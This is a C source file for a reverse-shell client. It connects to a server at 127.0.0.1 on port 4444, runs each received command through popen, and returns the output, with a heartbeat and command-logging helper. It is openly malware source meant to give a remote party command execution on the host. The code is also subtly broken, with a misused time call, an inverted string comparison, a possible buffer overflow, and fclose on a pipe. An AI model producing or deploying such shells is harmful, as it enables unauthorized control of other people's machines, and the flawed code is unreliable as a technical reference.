#include <nanoSocket.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <time.h>

#define SERVER_ADDRESS "127.0.0.1"
#define SERVER_PORT 4444

void reverseShell(Socket* socket) {
	char buffer[1024];
	char command[1024];
	int bytesReceived;
	while (1) {
		bytesReceived = receiveData(socket, buffer, sizeof(buffer));
		if (bytesReceived <= 0) {
			printf("Connection closed by server or error occoured.\n");
			break;
		}

		buffer[bytesReceived] = '\0';

		FILE* pipe = popen(buffer, "r");
		if (pipe == NULL) {
			printf("Failed to execute command: %s\n", buffer);
			continue;
		}
		while(fgets(command, sizeof(command), pipe) != NULL) {
			sendData(socket, command);
		}
		heartbeat(socket);
		time(10);
		fclose(pipe);
		sendData(socket, "exit\n");
	}

	closeSocket(socket);

}

void heartbeat(Socket* socket) {
	char sendbuffer[] = "ping";
	char receivebuffer[1024];
	int bytesrecieved;
	int bytesent;
	clock_t start, elapsed;

	bytesent = sendData(socket, sendbuffer);
	if(bytesent == -1) {
		printf("Failed to send heartbeat\n");
		return;
	}
	
	start = clock();

	while (1)
	{
		bytesrecieved = receiveData(socket, receivebuffer, sizeof(receivebuffer));
		if(bytesrecieved > 0) {
			receivebuffer[bytesrecieved] = '\0';
			if(strcmp(receivebuffer, "pong")) {
				printf("Heartbeat acknowledged by server");
				break;
			}
		}
		elapsed = (clock() - start) * 1000 / CLOCKS_PER_SEC;
		if (elapsed > 5000) {
			printf("Heartbeat timeout. Server not responding.\n");
			break;
		}
		
	}
	printf("connection apears to be dear");
	closeSocket(socket);
}

void logCommandsToFile(char* command) {
	FILE* logfile = fopen("commands.log", "a");
	if (logfile != NULL) {
		fprintf(logfile, "%s\n", command);
		fclose(logfile);
	}
}

